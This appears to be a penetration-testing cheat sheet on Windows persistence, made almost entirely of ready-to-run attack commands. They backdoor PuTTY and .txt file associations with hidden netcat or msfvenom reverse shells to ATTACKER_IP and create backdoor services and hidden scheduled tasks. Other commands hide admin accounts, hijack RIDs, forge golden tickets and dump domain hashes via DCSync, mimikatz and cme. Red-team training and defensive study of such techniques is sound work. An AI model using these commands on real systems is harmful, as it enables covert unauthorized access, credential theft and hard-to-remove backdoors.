# Persistence

{% embed url="https://hackmag.com/security/persistence-cheatsheet/" %}

{% hint style="info" %}
In many real-world penetration tests or red team engagements, persistence is not a part of the scope due to the risk of incomplete removal once the assessment is complete.
{% endhint %}

## Tampering with unprivileged accounts

{% code overflow="wrap" fullWidth="true" %}
```bash
# Assign Group Memberships
net localgroup administrators user0 /add
# If it looks to suspicious, use Backup Operators group which can read and write any file on the system
net localgroup "Backup Operators" user0 /add
# Since it is an unprivileged account, we cannot use RDP or evil-winrm by default
net localgroup "Remote Management Users" user0 /add
# If UAC disables Backup Operators to be used remotely, change this registry key (do it as Administrator)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

# Special Privileges and Security Descriptors
https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
# Instead of assigning groups to a user, modify privileges
# First, we will export the current configuration to a temporary file
secedit /export /cfg config.inf
# Open the file and add our user to the privileges SeBackupPrivilege and SeRestorePrivilege (for example)
# We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
# To assign WinRM privs to a user, run this command on PS (GUI needed)
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
# Then add the username and allow Full Control
# As on the previous section, if UAC disables Backup Operators to be used remotely, change this registry key
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

# RID Hijacking (RID is an identifier, last bit of SID, Administrator RID = 500, and regular users usually have RID >= 1000)
# We need to access SAM using Regedit but only available to SYSTEM (not even Administrator can edit). To run Regedit as SYSTEM:
PsExec64.exe -i -s regedit
# Go to HKLM\SAM\SAM\Domains\Account\Users\ and select the folder of the user to become "Administrator" (if its RID is 1010 = 0x3F2)
# Note it is little-endian so bytes appear reverse. To enter 500 = 0x01F4 we will enter F4 01
```
{% endcode %}

## Backdooring files

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Executable Files (for example, to replace a PuTTY shortcut pointing at C:\Program Files\PuTTY\putty.exe)
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
# Shorcut Files - edit shortcut target for this:
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
# Content of backdoor.ps1 (do not forget to leave the same shortcut icon)
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe

# Hijacking File Associations (change what command is run when a filetype is open, applicable to .txt for example)
# Find ProgID (Data column txtfile for .txt) under HKLM\Software\Classes\.txt
# Go to HKLM\Software\Classes\txtfile\shell\open\command and modify its value for 
powershell -windowstyle hidden C:\windows\backdoor2.ps1 %1
# The content of the file C:\Windows\backdoor2.ps1 is
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
# Now anytime we open a .txt file on that machine, it will send a revshell
```
{% endcode %}

## Services

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Creating backdoor services
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
# In case we want to run a executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2

# Modifying existing services
# List all services, take a disabled one
sc.exe query state=all
# Query the service
sc.exe qc THMService3
There are three things we care about when using a service for persistence:
• The executable (BINARY_PATH_NAME) should point to our payload.
• The service START_TYPE should be automatic so that the payload runs without user interaction.
• The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.
# Create the revshell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
# Reconfigure the service (we can query it later to confirm the changes)
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
sc.exe start THMService3
```
{% endcode %}

## Scheduled Tasks

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Create a scheduled task which runs every single minute (in a real-world scenario not that often)
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
schtasks /query /tn thm-taskbackdoor
# Making Our Task Invisible
c:\tools\pstools\PsExec64.exe -s -i regedit
# All scheduled tasks are stored in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
# There we will find a registry key with the task name, under which a value "SD" contains the security descriptor. Erase that value > Delete.
schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified. # after that, the task cannot be found
```
{% endcode %}

## Create SYSTEM user&#x20;

{% code overflow="wrap" %}
```bash
# We need Local Admin rights
net user USER PASS /add
net localgroup Administrators USER /add
# For RDP or WinRM
net localgroup "Remote Management Users" USER /add
# Check it works
net localgroup Administrators
# Hide Newly Created Local administrator
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v $USER /d 0 /f
```
{% endcode %}

## Golden Tickets

This attack can only be performed after domain compromise, resulting in obtaining the NTLM hash for the krbtgt account either via dumping the NTDS.dit AD database and extracting credentials, or via the DCSync attack discussed previously.&#x20;

This is an excellent persistence mechanism because a Golden Ticket can be created for real users that exist in the domain and can be difficult to detect because:

* They are valid TGTs.&#x20;
* Windows event logs do not alert on a maliciously created TGT.
* Resetting an impersonated account’s password does not invalidate the Golden Ticket.&#x20;

To invalidate a Golden Ticket, the password for the krbtgt account must be changed twice. One caveat to this is that the first change needs to be replicated across the entire domain before the second password change can happen, which can take up to 24 hours.&#x20;

{% code overflow="wrap" fullWidth="true" %}
```bash
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#Sec_KRBTGT
https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos

Getting krbtgt password hash, we could create our own self-made custom TGTs, or golden tickets.
For example, we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins group.
Requirements (at least one):
- account that is a member of the Domain Admins group
- DC compromised

# We want to access the DC but find access denied with the following command
C:\Tools\SysinternalsSuite>PsExec64.exe \\dc01 cmd.exe
mimikatz > privilege::debug
mimikatz > lsadump::lsa /patch # grab domain SID and krbtgt hash from the output
# Creating the golden ticket and injecting it into memory does not require any admin privs and can even be done from a computer that is not joined to the domain. 
# Before generating the golden ticket, we'll delete any existing Kerberos tickets
mimikatz > kerberos::purge
mimikatz > kerberos::golden /user:$EXISTING_USER /domain:domain..com /sid:$DOMAIN_SID /krbtgt:$KRBTGT_NTLM_HASH /ptt
# From July 2022 the ticket has to include an existing user on the domain under /user:
# We should see User id 500 on the ticket which means domain admins group and "Golden ticket successfully..."
# With the golden ticket injected into memory, we can launch a new command prompt
mimikatz > misc::cmd
# attempt lateral movement with PsExec
C:\Users\user.corp > psexec.exe \\dc01 cmd.exe # perform overpass the hash, with IP instead of hostname would not work
# We should see corp\fakeuser and Domain Admins group with whoami and whoami /groups
```
{% endcode %}

## DCSync

{% code overflow="wrap" fullWidth="true" %}
```c
# DCSync (Domain Controller Synchronization)
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772726(v=ws.10)?redirectedfrom=MSDN
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961761(v=technet.10)?redirectedfrom=MSDN
https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
Requirements: 
- Compromise of a domain administrator account
# Open Mimikatz and start the replication, /user is the target user to sync
mimikatz > lsadump::dcsync /user:Administrator
The dump contains multiple hashes associated with the last twenty-nine used user passwords as well as the hashes used with AES encryption.
Using the technique above, we can request a replication update with a domain controller and obtain the password hashes of every account in Active Directory without ever logging in to the domain controller.
```
{% endcode %}

## Add RDP / WinRM groups to log in

{% code overflow="wrap" %}
```c
cmd.exe /c net localgroup "Remote Desktop Users" test123 /add && net localgroup "Remote Management Users" test123 /add
```
{% endcode %}

## Enable RDP access

```bash
# ADMINISTRATOR NEEDED
cme smb/winrm $IP -u $USER -p $PASS -M rdp -o action=enable
# Scan with nmap port 3389 to see if it is open
nmap -p 3389 $IP 
# If not, check if RDP port is present on the target
PS> netstat -nat | findstr 3389
# If it is open externally, we need (reverse) port forwarding with chisel for example
LINUX> ./chisel server -p 1234 --reverse
WINDOWS> chisel.exe client $ATTACKING_IP:1234 R:3389:127.0.0.1:3389
# To confirm it is working
nmap -p 3389 127.0.0.1
```

## Create scheduled task

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Create a scheduled task to run as SYSTEM by providing Administrator credentials:
PS > $pw = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)

PS > Invoke-Command -Computer $LDAP_COMMON_NAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
SUCCESS: The scheduled task "shell" has successfully been created.
PS > Invoke-Command -Computer $LDAP_COMMON_NAME -ScriptBlock { schtasks /run /tn shell } -Credential $creds
SUCCESS: Attempted to run the scheduled task "shell".
```
{% endcode %}

## Persistent Backdoors

```bash
# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
```

## Open SMB to the outside

{% code overflow="wrap" fullWidth="true" %}
```bash
# Local Admin rights needed
# GENERATE NEW FIREWALL RULE
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow
# CHECK IT WITH NMAP
nmap -p 445 $IP
# CREATE NEW SHARE
C:\> net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
C:\>cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
# CHECK IF IT SAYS PWNED!
cme smb 10.10.10.8 -u 'antz' -p 'antz123!'
# DUMP NTLM HASHES OF ACTIVE DIRECTORY TO USE PASS THE HASH
cme smb 10.10.10.8 -u 'antz' -p 'antz123!' --sam
cme smb 10.10.10.8 -u 'antz' -p 'antz123!' --ntds vss
# ENABLE RDP
netsh advfirewall firewall add rule name="RDP Port" protocol=TCP dir=in localport=3389 action=allow
netsh advfirewall firewall add rule name="RDP Port" protocol=TCP dir=out localport=3389 action=allow
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net localgroup "Remote Desktop Users" antz /add
```
{% endcode %}

## DNS Zones

{% code overflow="wrap" %}
```bash
# Once we compromised the box, we can check for other DNS records and IPs
PS> Export-DNSServerZone -Filename domain.com -Name DOMAIN.COM # output file will be on c:\windows\system32\dns
```
{% endcode %}

## Metasploit

{% code overflow="wrap" %}
```bash
# First we generate a Meterpreter shell using msfvenom (check arch x86/x64)
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
# Then we use multi/handler on Metasploit to get the shell
msf > use exploit/multi/handler
# We run the executable to get a Meterpreter shell
meterpreter >
# This module will send a payload every 10 seconds in default
msf > use exploit/windows/local/persistence 
msf > set session 1 s#et the session to your background meterpreter session
msf > run
# If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler
```
{% endcode %}
